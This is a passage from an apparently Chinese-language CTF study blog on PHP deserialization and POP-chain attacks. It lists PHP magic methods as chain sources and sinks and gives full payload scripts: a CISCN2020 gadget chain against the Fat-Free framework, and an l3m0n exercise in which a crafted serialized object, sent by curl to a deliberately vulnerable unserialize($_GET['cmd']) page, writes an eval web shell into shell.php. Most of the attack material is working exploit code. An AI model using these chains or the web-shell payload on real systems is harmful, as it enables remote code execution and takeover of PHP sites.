<span class="hljs-variable">$tmp</span>  = console(serialize(<span class="hljs-keyword">new</span> topsolo(<span class="hljs-keyword">new</span> midsolo(<span class="hljs-keyword">new</span> jungle()))));
<span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://127.0.0.1/qw/webfuzhu/html/&#x27;</span>;
CURL(<span class="hljs-variable">$url</span>.pad(<span class="hljs-variable">$tmp</span>));
<span class="hljs-keyword">echo</span> CURL(<span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27;play.php&#x27;</span>);</code></pre></div>





<h3 id="由短变长：0ctf2016piapiapia"><a href="#由短变长：0ctf2016piapiapia" class="headerlink" title="由短变长：0ctf2016piapiapia"></a>由短变长：0ctf2016piapiapia</h3><ul>
<li>由短变长：将payload连接到前面的字段，使其覆盖到后面的字段。</li>
<li>由长变短：将payload连接到后面的字段，使其往前覆盖</li>
</ul>
<h2 id="0x04-php反序列化POP链"><a href="#0x04-php反序列化POP链" class="headerlink" title="0x04 php反序列化POP链"></a>0x04 php反序列化POP链</h2><h3 id="方法列表-1"><a href="#方法列表-1" class="headerlink" title="方法列表"></a>方法列表</h3><div class="hljs code-wrapper"><pre><code class="hljs php">起点：
__destruct() <span class="hljs-comment">//对象被销毁时触发</span>
__wakeup() <span class="hljs-comment">//unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span>
__toString() <span class="hljs-comment">//__toString() 方法用于一个类被当成字符串时应怎样回应</span>
   

中间跳板：
__call() <span class="hljs-comment">//在对象上下文中调用不可访问的方法时触发</span>
__callStatic() <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span>
__get() <span class="hljs-comment">//用于从不可访问的属性读取数据</span>
__set() <span class="hljs-comment">//用于将数据写入不可访问的属性</span>
__isset() <span class="hljs-comment">//在不可访问的属性上调用isset()或empty()触发</span>
__unset() <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span>
__invoke() <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span>
__toString() <span class="hljs-comment">//</span>

终点：
__call: 调用不可访问或不存在的方法时被调用
call_user_func、call_user_func_array等代码执行点
    
其他：
__construct()<span class="hljs-comment">//创建对象时触发0</span>
__sleep() <span class="hljs-comment">//对象被序列化之前触发</span></code></pre></div>



<h3 id="CISCN：babyunserialize"><a href="#CISCN：babyunserialize" class="headerlink" title="CISCN：babyunserialize"></a>CISCN：babyunserialize</h3><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42697109/article/details/108212765">CISCN2020初赛 writeup web部分</a></li>
</ul>
<p><strong>payload</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">CLI</span>&#123;
    <span class="hljs-title">class</span> <span class="hljs-title">Agent</span>
    &#123;
        <span class="hljs-title">protected</span> $<span class="hljs-title">server</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$server</span></span>)</span>
<span class="hljs-function">        </span>&#123;
            <span class="hljs-keyword">$this</span>-&gt;server=<span class="hljs-variable">$server</span>;
        &#125;
    &#125;

    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WS</span></span>
<span class="hljs-class">    </span>&#123;
    &#125;
&#125;
<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>&#123;
    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Cursor</span>  <span class="hljs-title">implements</span> \<span class="hljs-title">IteratorAggregate</span> &#123;&#125;
    <span class="hljs-title">class</span> <span class="hljs-title">Mongo</span> &#123;
        <span class="hljs-title">public</span> $<span class="hljs-title">events</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$events</span></span>)</span>
<span class="hljs-function">        </span>&#123;
            <span class="hljs-keyword">$this</span>-&gt;events=<span class="hljs-variable">$events</span>;
        &#125;
    &#125;
&#125;

<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">Jig</span>&#123;
    <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> <span class="hljs-title">extends</span> \<span class="hljs-title">DB</span>\<span class="hljs-title">Cursor</span> &#123;
        <span class="hljs-title">protected</span> $<span class="hljs-title">legacy</span>=0;
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$db</span>;
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$file</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$db</span>,<span class="hljs-variable">$file</span></span>)</span>&#123;
            <span class="hljs-keyword">$this</span>-&gt;db=<span class="hljs-variable">$db</span>;
            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;
        &#125;
    &#125;
&#125;
<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span>&#123;
    <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> <span class="hljs-title">extends</span> \<span class="hljs-title">DB</span>\<span class="hljs-title">Cursor</span>&#123;
        <span class="hljs-title">protected</span> $<span class="hljs-title">props</span>=[&quot;<span class="hljs-title">read</span>&quot;=&gt;&quot;<span class="hljs-title">phpinfo</span>&quot;];
    &#125;
&#125;

<span class="hljs-keyword">namespace</span>&#123;
    $<span class="hljs-title">SQLMapper</span>=<span class="hljs-title">new</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span>\<span class="hljs-title">Mapper</span>();
<span class="hljs-comment">//    echo serialize($SQLMapper),&quot;\n&quot;;</span>
    <span class="hljs-variable">$JigMapper</span>=<span class="hljs-keyword">new</span> DB\Jig\Mapper(<span class="hljs-variable">$SQLMapper</span>,INFO_ALL );
<span class="hljs-comment">//    $MongoMapper  = new CLI\WS();</span>
    <span class="hljs-variable">$DBMongo</span>=<span class="hljs-keyword">new</span> DB\Mongo(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;disconnect&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$JigMapper</span>,<span class="hljs-string">&quot;update&quot;</span>)));
    <span class="hljs-variable">$Agent</span>=<span class="hljs-keyword">new</span> CLI\Agent(<span class="hljs-variable">$DBMongo</span>);
    <span class="hljs-variable">$WS</span>=<span class="hljs-keyword">new</span> CLI\WS();
    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$WS</span>,<span class="hljs-variable">$Agent</span>)));
&#125;</code></pre></div>



<h3 id="l3m0n-pop链学习"><a href="#l3m0n-pop链学习" class="headerlink" title="l3m0n pop链学习"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/">l3m0n</a> pop链学习</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>&#123;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$matchPattern</span>;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$replacement</span>;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$repl</span></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;matchPattern = <span class="hljs-variable">$pattern</span>;
    <span class="hljs-keyword">$this</span>-&gt;replacement = <span class="hljs-variable">$repl</span>;
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;
    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-keyword">$this</span>-&gt;matchPattern, <span class="hljs-keyword">$this</span>-&gt;replacement, <span class="hljs-variable">$data</span>);
  &#125;
&#125;;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>&#123;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filters</span>;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$endl</span>;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filters</span>, <span class="hljs-variable">$endl</span></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;filters = <span class="hljs-variable">$filters</span>;
    <span class="hljs-keyword">$this</span>-&gt;endl = <span class="hljs-variable">$endl</span>;
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span>(<span class="hljs-params"><span class="hljs-variable">$txt</span></span>) </span>&#123;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filters <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>) &#123;
      <span class="hljs-variable">$txt</span> = <span class="hljs-variable">$filter</span>-&gt;filter(<span class="hljs-variable">$txt</span>);
    &#125;
    <span class="hljs-variable">$txt</span> = str_replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;endl, <span class="hljs-variable">$txt</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$txt</span>;
  &#125;
&#125;;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>&#123;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$format</span>;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$format</span></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;filename = str_replace(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, str_replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-variable">$filename</span>));
    <span class="hljs-keyword">$this</span>-&gt;format = <span class="hljs-variable">$format</span>;
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeLog</span>(<span class="hljs-params"><span class="hljs-variable">$txt</span></span>) </span>&#123;
    <span class="hljs-variable">$txt</span> = <span class="hljs-keyword">$this</span>-&gt;format-&gt;format(<span class="hljs-variable">$txt</span>);
    <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span> Modify the address here, and delete this TODO.</span>
    file_put_contents(<span class="hljs-string">&quot;E:\\WWW\\test\\ctf&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-variable">$txt</span>, FILE_APPEND);
  &#125;
&#125;;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>&#123;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$logwriter</span>;<span class="hljs-comment">//这里装入LogWriter_File对象</span>
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$writer</span></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;logwriter = <span class="hljs-variable">$writer</span>;
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$txt</span></span>) </span>&#123;<span class="hljs-comment">//这里偷梁换柱Song的log</span>
    <span class="hljs-keyword">$this</span>-&gt;logwriter-&gt;writeLog(<span class="hljs-variable">$txt</span>);
  &#125;
&#125;;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Song</span> </span>&#123;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$logger</span>;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$group</span>;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$url</span>;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$group</span>, <span class="hljs-variable">$url</span></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">$this</span>-&gt;group = <span class="hljs-variable">$group</span>;
    <span class="hljs-keyword">$this</span>-&gt;url = <span class="hljs-variable">$url</span>;
    <span class="hljs-variable">$fltr</span> = <span class="hljs-keyword">new</span> OutputFilter(<span class="hljs-string">&quot;/\[i\](.*)\[\/i\]/i&quot;</span>, <span class="hljs-string">&quot;&lt;i&gt;\\1&lt;/i&gt;&quot;</span>);
    <span class="hljs-keyword">$this</span>-&gt;logger = <span class="hljs-keyword">new</span> Logger(<span class="hljs-keyword">new</span> LogWriter_File(<span class="hljs-string">&quot;song_views&quot;</span>, <span class="hljs-keyword">new</span> LogFileFormat(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$fltr</span>), <span class="hljs-string">&quot;\n&quot;</span>)));
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;url . <span class="hljs-string">&quot;&#x27;&gt;&lt;i&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot;&lt;/i&gt;&lt;/a&gt; by &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group;
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;logger-&gt;log(<span class="hljs-string">&quot;Song &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&quot; by [i]&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;group . <span class="hljs-string">&quot;[/i] viewed.\n&quot;</span>);
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_name</span>(<span class="hljs-params"></span>) </span>&#123;
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;name;
  &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>&#123;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$lyrics</span>;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$song</span>;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span>, <span class="hljs-variable">$song</span></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;song = <span class="hljs-variable">$song</span>;
    <span class="hljs-keyword">$this</span>-&gt;lyrics = <span class="hljs-variable">$lyrics</span>;
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;__toString() . <span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . str_replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;lyrics) . <span class="hljs-string">&quot;&lt;/p&gt;\n&quot;</span>;
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;song-&gt;log();
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shortForm</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=&#x27;song.php?name=&quot;</span> . urlencode(<span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() . <span class="hljs-string">&quot;&lt;/a&gt;&lt;/p&gt;&quot;</span>;
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name_is</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;song-&gt;get_name() === <span class="hljs-variable">$name</span>;
  &#125;
&#125;;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;
  <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;
    <span class="hljs-variable">$oldlyrics</span> = <span class="hljs-keyword">array</span>();
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lyrics&#x27;</span>])) &#123;
      <span class="hljs-variable">$oldlyrics</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lyrics&#x27;</span>]));
    &#125;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$lyrics</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$lyric</span>) <span class="hljs-variable">$oldlyrics</span> []= <span class="hljs-variable">$lyric</span>;
    setcookie(<span class="hljs-string">&#x27;lyrics&#x27;</span>, base64_encode(serialize(<span class="hljs-variable">$oldlyrics</span>)));
  &#125;
  <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lyrics&#x27;</span>])) &#123;
      <span class="hljs-keyword">return</span> unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lyrics&#x27;</span>]));
    &#125;
    <span class="hljs-keyword">else</span> &#123;
      setcookie(<span class="hljs-string">&#x27;lyrics&#x27;</span>, base64_encode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))));
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);
    &#125;
  &#125;
&#125;;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Porter</span> </span>&#123;
  <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exportData</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;
    <span class="hljs-keyword">return</span> base64_encode(serialize(<span class="hljs-variable">$lyrics</span>));
  &#125;
  <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">importData</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;
    <span class="hljs-keyword">return</span> serialize(base64_decode(<span class="hljs-variable">$lyrics</span>));
  &#125;
&#125;;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Conn</span> </span>&#123;
  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$conn</span>;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$db</span></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;conn = mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$db</span>);
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLyrics</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;
    <span class="hljs-variable">$r</span> = <span class="hljs-keyword">array</span>();
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$lyrics</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$lyric</span>) &#123;
      <span class="hljs-variable">$s</span> = intval(<span class="hljs-variable">$lyric</span>);
      <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SELECT data FROM lyrics WHERE id=<span class="hljs-subst">$s</span>&quot;</span>);
      <span class="hljs-keyword">while</span> ((<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_row()) != <span class="hljs-literal">NULL</span>) &#123;
        <span class="hljs-variable">$r</span> []= unserialize(base64_decode(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]));
      &#125;
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$r</span>;
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addLyrics</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span></span>) </span>&#123;
    <span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>();
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$lyrics</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$lyric</span>) &#123;
      <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot;</span> . base64_encode(serialize(<span class="hljs-variable">$lyric</span>)) . <span class="hljs-string">&quot;\&quot;)&quot;</span>);
      <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SELECT MAX(id) FROM lyrics&quot;</span>);
      <span class="hljs-variable">$id</span>= <span class="hljs-variable">$res</span>-&gt;fetch_row(); <span class="hljs-variable">$ids</span>[]= intval(<span class="hljs-variable">$id</span>[<span class="hljs-number">0</span>]);
    &#125;
    <span class="hljs-keyword">echo</span> var_dump(<span class="hljs-variable">$ids</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$ids</span>; 
  &#125;
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;conn-&gt;close();
    <span class="hljs-keyword">$this</span>-&gt;conn = <span class="hljs-literal">NULL</span>;
  &#125;
&#125;;
unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</code></pre></div>



<ul>
<li>我们新建一个Lyrics对象</li>
<li>将它的song属性为Song对象</li>
<li>Song对象的log属性填充成Logger对象</li>
<li>再把logger对象的logwriter的属性填充成LogWriter_File对象</li>
<li>LogWriter_File的$format属性设置成OutputFilter</li>
<li>OutputFilter里面的filter方法用preg_match写入一句话。</li>
</ul>
<p><strong>payload</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//require_once &#x27;index.php&#x27;;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$matchPattern</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$replacement</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$repl</span></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;matchPattern = <span class="hljs-variable">$pattern</span>;
        <span class="hljs-keyword">$this</span>-&gt;replacement = <span class="hljs-variable">$repl</span>;
    &#125;
&#125;;


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$format</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$format</span></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;filename = str_replace(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, str_replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-variable">$filename</span>));
        <span class="hljs-keyword">$this</span>-&gt;format = <span class="hljs-variable">$format</span>;
    &#125;
&#125;;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$logwriter</span>;<span class="hljs-comment">//这里装入LogWriter_File对象</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$writer</span></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;logwriter = <span class="hljs-variable">$writer</span>;
    &#125;
&#125;;


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filters</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$endl</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filters</span>, <span class="hljs-variable">$endl</span></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;filters = <span class="hljs-variable">$filters</span>;
        <span class="hljs-keyword">$this</span>-&gt;endl = <span class="hljs-variable">$endl</span>;
    &#125;
&#125;;


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lyrics</span> </span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$lyrics</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$song</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$lyrics</span>, <span class="hljs-variable">$song</span></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;song = <span class="hljs-variable">$song</span>;
        <span class="hljs-keyword">$this</span>-&gt;lyrics = <span class="hljs-variable">$lyrics</span>;
    &#125;
&#125;;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Song</span> </span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$logger</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$group</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$url</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logger</span></span>) </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-string">&#x27;&#x27;</span>;
        <span class="hljs-keyword">$this</span>-&gt;group = <span class="hljs-string">&#x27;&#x27;</span>;
        <span class="hljs-keyword">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;
    &#125;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CURL</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;
    <span class="hljs-variable">$ch</span> = curl_init();
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">FALSE</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
    curl_close(<span class="hljs-variable">$ch</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
&#125;

<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Lyrics(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-keyword">new</span> Song(<span class="hljs-keyword">new</span> Logger(<span class="hljs-keyword">new</span> LogWriter_File(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-keyword">new</span> LogFileFormat(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> OutputFilter(<span class="hljs-string">&#x27;/Song/&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_GET[&quot;drom&quot;]);?&gt;&#x27;</span>)),<span class="hljs-string">&#x27;\n&#x27;</span>)))));
CURL(<span class="hljs-string">&#x27;http://127.0.0.1/lemon/index.php?cmd=&#x27;</span>.urlencode(serialize(<span class="hljs-variable">$a</span>)));
